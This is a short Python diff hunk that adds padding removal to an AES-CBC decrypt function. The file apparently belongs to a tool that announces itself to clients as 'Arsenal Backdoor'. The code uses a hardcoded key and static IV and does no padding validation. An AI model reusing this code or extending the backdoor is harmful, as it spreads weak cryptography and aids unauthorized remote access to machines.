@@ -24,7 +24,7 @@ def do_encrypt(message):
 def do_decrypt(ciphertext):
     obj2 = AES.new('This is a key123', AES.MODE_CBC, 'This is an IV456')
     message = obj2.decrypt(ciphertext)
-    return message
+    return message[:-message[-1]]
 
 def client(conn, addr, buff):
     conn.send(do_encrypt('Arsenal Backdoor'))
